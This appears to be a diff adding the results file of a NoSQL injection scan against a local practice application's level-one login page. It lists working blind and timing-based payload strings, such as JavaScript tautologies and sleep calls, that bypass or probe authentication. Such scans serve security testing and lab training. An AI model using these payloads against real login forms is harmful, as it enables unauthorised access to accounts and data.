@@ -1,0 +1,30 @@
+=== RESULTS ===
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: =true: ';return true;', false: "';return false;'"
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: =true: ';return true;'}//, false: "';return false;'}//"
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: =true: ' || 'a'=='a' || 'a'=='a//, false: "' && 'a'!='a' && 'a'!='a//"
+
+Found Blind NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: =true: ' || 'a'=='a' || 'a'=='a, false: "' && 'a'!='a' && 'a'!='a"
+
+Found Timing based NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: ="';sleep(500);'"
+
+Found Timing based NoSQL Injection:
+        URL: http://localhost:3000/level1/login
+        param:
+        Injection: ="';sleep(500);'}//"
